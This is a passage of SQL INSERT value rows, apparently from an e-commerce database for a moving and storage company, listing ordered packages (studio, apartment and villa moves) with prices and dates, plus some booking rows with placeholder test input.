(8, 8, 5, 15, 'moving package test', 1, 1500, 22, 'moving test', 21, 'moving sub service test', 22, 'test moving package 1', 'moving-package-test', '1705465951desktop-wallpaper-10-mb-in-2020-dark-logo.jpg', NULL, 2, '2024-01-17', 0, 10, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(9, 9, 17, 16, '1 Bedroom Apartment Move', 1, 150, 23, 'Moving and Storage', 22, 'Apartment Moving', 23, 'Apartment Moving', '1-bedroom-apartment-move', '1706199329IMG_BD859A5ED8BB-1.jpeg', 15, 0, '2024-01-26', 128, 4, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(10, 10, 18, 16, '1 Bedroom Apartment Move', 1, 150, 23, 'Moving and Storage', 22, 'Apartment Moving', 23, 'Apartment Moving', '1-bedroom-apartment-move', '1706199329IMG_BD859A5ED8BB-1.jpeg', 15, 0, '2024-01-26', 128, 4, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(11, 11, 18, 16, '1 Bedroom Apartment Move', 1, 150, 23, 'Moving & Storage', 22, 'Apartment Moving', 23, 'Apartment Moving', '1-bedroom-apartment-move', '1706199329IMG_BD859A5ED8BB-1.jpeg', 15, 0, '2024-01-29', 128, 4, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(12, 12, 18, 16, '1 Bedroom Apartment Move', 1, 150, 23, 'Moving & Storage', 22, 'Apartment Moving', 23, 'Apartment Moving', '1-bedroom-apartment-move', '1706199329IMG_BD859A5ED8BB-1.jpeg', 15, 0, '2024-01-29', 128, 4, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(13, 13, 18, 16, '1 Bedroom Apartment Move', 1, 150, 23, 'Moving & Storage', 22, 'Apartment Moving', 23, 'Apartment Moving', '1-bedroom-apartment-move', '1706199329IMG_BD859A5ED8BB-1.jpeg', 15, 0, '2024-01-29', 128, 4, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(14, 14, 18, 16, '1 Bedroom Apartment Move', 1, 150, 23, 'Moving & Storage', 22, 'Apartment Moving', 23, 'Apartment Moving', '1-bedroom-apartment-move', '1706199329IMG_BD859A5ED8BB-1.jpeg', 15, 0, '2024-01-29', 128, 4, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(15, 15, 16, 23, 'Studio | Premium', 1, 945, 30, 'Moving & Storage', 23, 'Apartment Moving', 30, 'Storage', 'studio-premium', '1708850376international-move.jpg', NULL, 2, '2024-02-26', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(16, 16, 20, 21, 'Studio | Budget', 1, 735, 30, 'Moving & Storage', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-02-27', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(17, 17, 21, 21, 'Studio | Budget', 1, 735, 30, 'Moving & Storage', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-02-28', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(18, 18, 19, 37, '3 BR Villa | Budget', 3, 2420, 30, 'Moving & Storage', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-budget', 'no-image.png', NULL, 2, '2024-02-29', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(19, 19, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving & Storage', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-02-29', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(20, 20, 19, 37, '3 BR Villa | Budget', 1, 2420, 30, 'Moving & Storage', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-budget', 'no-image.png', NULL, 2, '2024-02-29', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(21, 21, 19, 21, 'Studio | Budget', 2, 735, 30, 'Moving & Storage', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-02-29', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(22, 22, 19, 21, 'Studio | Budget', 3, 735, 30, 'Moving & Storage', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-02-29', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(23, 23, 19, 25, '1 BR Apartment | Budget', 2, 945, 30, 'Moving & Storage', 23, 'Apartment Moving', 30, 'Apartment Moving', '1-br-apartment-budget', 'no-image.png', NULL, 2, '2024-02-29', 0, 12, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(24, 24, 19, 21, 'Studio | Budget', 4, 735, 30, 'Moving & Storage', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-03-01', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(25, 24, 19, 22, 'Studio | Standard', 6, 840, 30, 'Moving & Storage', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-standard', '1708849758international-move.jpg', NULL, 2, '2024-03-01', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(26, 24, 19, 23, 'Studio | Premium', 2, 945, 30, 'Moving & Storage', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-premium', '1708850376international-move.jpg', NULL, 2, '2024-03-01', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(27, 25, 19, 37, '3 BR Villa | Budget', 1, 2420, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-budget', 'no-image.png', NULL, 2, '2024-03-28', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(28, 26, 19, 39, '3 BR Villa | Premium', 1, 3470, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-premium', 'no-image.png', NULL, 2, '2024-03-29', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(29, 27, 19, 39, '3 BR Villa | Premium', 1, 3470, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-premium', 'no-image.png', NULL, 2, '2024-03-29', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(30, 28, 19, 39, '3 BR Villa | Premium', 1, 3470, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-premium', 'no-image.png', NULL, 2, '2024-03-29', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(31, 29, 19, 39, '3 BR Villa | Premium', 1, 3470, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-premium', 'no-image.png', NULL, 2, '2024-03-29', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(32, 30, 19, 39, '3 BR Villa | Premium', 1, 3470, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-premium', 'no-image.png', NULL, 2, '2024-03-29', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(33, 31, 19, 47, 'test', 1, 123, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', 'test', 'no-image.png', NULL, 2, '2024-03-29', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(34, 32, 19, 47, 'test', 1, 123, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', 'test', 'no-image.png', NULL, 2, '2024-03-29', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(35, 33, 19, 47, 'test', 1, 123, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', 'test', 'no-image.png', NULL, 2, '2024-03-29', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(36, 34, 19, 37, '3 BR Villa | Budget', 1, 2420, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-budget', 'no-image.png', NULL, 2, '2024-03-30', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(37, 35, 19, 37, '3 BR Villa | Budget', 1, 2420, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-budget', 'no-image.png', NULL, 2, '2024-03-30', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(38, 36, 19, 37, '3 BR Villa | Budget', 1, 2420, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-budget', 'no-image.png', NULL, 2, '2024-03-30', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(39, 37, 19, 37, '3 BR Villa | Budget', 1, 2420, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-budget', 'no-image.png', NULL, 2, '2024-03-30', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(40, 38, 19, 39, '3 BR Villa | Premium', 1, 3470, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-premium', 'no-image.png', NULL, 2, '2024-03-30', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(41, 38, 19, 40, '4 BR Villa | Budget', 1, 3045, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '4-br-villa-budget', 'no-image.png', NULL, 2, '2024-03-30', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(42, 39, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-09', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(43, 40, 19, 49, 'Test-Packages', 1, 1, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'test-packages', 'no-image.png', NULL, 2, '2024-05-09', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(44, 41, 19, 49, 'Test-Packages', 1, 1, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'test-packages', 'no-image.png', NULL, 2, '2024-05-09', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(45, 42, 19, 49, 'Test-Packages', 1, 1, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'test-packages', 'no-image.png', NULL, 2, '2024-05-09', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(46, 42, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-09', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(47, 43, 19, 49, 'Test-Packages', 1, 10, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'test-packages', 'no-image.png', NULL, 2, '2024-05-09', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(48, 44, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-16', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(49, 44, 19, 30, '2 BR Apartment | Premium', 1, 2410, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', '2-br-apartment-premium', 'no-image.png', NULL, 2, '2024-05-16', 0, 0, 1, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(50, 45, 25, 40, '4 BR Villa | Budget', 1, 3045, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '4-br-villa-budget', 'no-image.png', NULL, 2, '2024-05-16', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(51, 46, 10, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-18', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(52, 47, 10, 23, 'Studio | Premium', 1, 945, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-premium', '1708850376international-move.jpg', NULL, 2, '2024-05-18', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(53, 48, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-18', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(54, 49, 19, 22, 'Studio | Standard', 1, 840, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-standard', '1708849758international-move.jpg', NULL, 2, '2024-05-18', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(55, 50, 19, 25, '1 BR Apartment | Budget', 1, 945, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', '1-br-apartment-budget', 'no-image.png', NULL, 2, '2024-05-18', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(56, 51, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-18', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(57, 52, 10, 23, 'Studio | Premium', 1, 945, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-premium', '1708850376international-move.jpg', NULL, 2, '2024-05-18', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(58, 52, 10, 22, 'Studio | Standard', 1, 840, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-standard', '1708849758international-move.jpg', NULL, 2, '2024-05-18', 0, 0, 1, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(59, 53, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-20', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(60, 54, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-20', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(61, 55, 6, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-21', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(62, 56, 6, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-22', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(63, 57, 16, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-23', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(64, 58, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-23', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(65, 59, 16, 46, 'Suhaan', 1, 1, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'suhaan', 'no-image.png', NULL, 2, '2024-05-24', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(66, 60, 16, 46, 'Suhaan', 2, 1, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'suhaan', 'no-image.png', NULL, 2, '2024-05-24', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(67, 61, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-28', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(68, 62, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-28', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(69, 63, 31, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-29', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(70, 64, 16, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-29', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(71, 65, 32, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-30', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(72, 66, 32, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-30', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(73, 67, 32, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-05-30', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(74, 68, 33, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-06-01', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(75, 69, 19, 22, 'Studio | Standard', 1, 840, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-standard', '1708849758international-move.jpg', NULL, 2, '2024-06-01', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(76, 70, 33, 37, '3 BR Villa | Budget', 1, 2420, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '3-br-villa-budget', 'no-image.png', NULL, 2, '2024-06-01', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(77, 71, 32, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-06-01', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(78, 72, 32, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-06-01', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(79, 73, 33, 21, 'Studio | Budget', 2, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-06-07', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(80, 74, 19, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-06-08', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(81, 75, 19, NULL, NULL, NULL, NULL, 45, NULL, 28, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-10', 0, 0, 0, '1', '2', 'Multiple times a week', 'yes', NULL, 'office', 'Dubai', 'area', 'asfas', 'asf', '12', 'June', '2024', '10:00 AM - 10:30 AM', 'Monday,Tuesday,Wednesday'),
(82, 76, 19, NULL, NULL, NULL, NULL, 45, NULL, 28, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-10', 0, 0, 0, '1', '2', 'Multiple times a week', 'yes', NULL, 'office', 'Dubai', 'area', 'asfas', 'asf', '12', 'June', '2024', '10:00 AM - 10:30 AM', 'Monday,Tuesday,Wednesday'),
(83, 77, 19, NULL, NULL, NULL, NULL, 45, NULL, 28, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-10', 0, 0, 0, '1', '2', 'Once', 'no', NULL, 'home', 'Dubai', 'asf', 'asf', 'asf', '11', 'June', '2024', '12:00 PM - 12:30 PM', ''),
(84, 78, 19, NULL, NULL, NULL, NULL, 45, NULL, 28, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-10', 0, 0, 0, '1', '2', 'Once', 'no', NULL, 'home', 'Dubai', 'asfd', 'asf', 'asf', '11', 'June', '2024', '3:00 PM - 3:30 PM', ''),
(85, 79, 19, NULL, NULL, NULL, NULL, 45, NULL, 28, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-10', 0, 0, 0, '2', '3', 'Once', 'no', NULL, 'other', 'Abu Dhabhi', 'area', 'asf', 'asf', '12', 'June', '2024', '9:00 AM - 9:30 AM', ''),
(86, 80, 19, NULL, NULL, NULL, NULL, 45, NULL, 30, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-10', 0, 0, 0, '1', '2', 'Weekly', 'no', NULL, 'office', 'Dubai', 'asf', 'asf', 'asf', '11', 'June', '2024', '12:00 PM - 12:30 PM', ''),
(87, 81, 19, NULL, NULL, NULL, NULL, 45, NULL, 28, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-10', 0, 0, 0, '2', '3', 'Multiple times a week', 'yes', NULL, 'home', 'Sharjah', 'asfas', 'asfa', 'asf', '13', 'June', '2024', '6:00 PM - 6:30 PM', 'Monday,Tuesday'),
(88, 82, 19, NULL, NULL, NULL, NULL, 45, NULL, 30, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-11', 0, 0, 0, '1', '2', 'Weekly', 'yes', NULL, 'home', 'Dubai', 'area', 'asf', 'asf', '12', 'June', '2024', '8:00 AM - 8:30 AM', ''),
(89, 83, 19, NULL, NULL, NULL, NULL, 45, NULL, 28, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '2024-06-11', 0, 0, 0, '2', '3', 'Multiple times a week', 'yes', NULL, 'home', 'Abu Dhabhi', 'Near Refineary', '120', '130', '14', 'June', '2024', '5:00 PM - 5:30 PM', 'Monday,Tuesday,Wednesday'),
(90, 84, 35, 45, '5 BR Villa | Premium', 1, 5780, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '5-br-villa-premium', 'no-image.png', NULL, 2, '2024-06-11', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(91, 84, 35, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-06-11', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(92, 85, 35, 45, '5 BR Villa | Premium', 1, 5780, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '5-br-villa-premium', 'no-image.png', NULL, 2, '2024-06-11', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(93, 85, 35, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-06-11', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(94, 86, 35, 45, '5 BR Villa | Premium', 1, 5780, 30, 'Moving', 26, 'Villa Moving', 30, 'Villa Moving', '5-br-villa-premium', 'no-image.png', NULL, 2, '2024-06-11', 0, 20, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
(95, 86, 35, 21, 'Studio | Budget', 1, 735, 30, 'Moving', 23, 'Apartment Moving', 30, 'Apartment Moving', 'studio-budget', '1708848958international-move.jpg', NULL, 2, '2024-06-11', 0, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL),
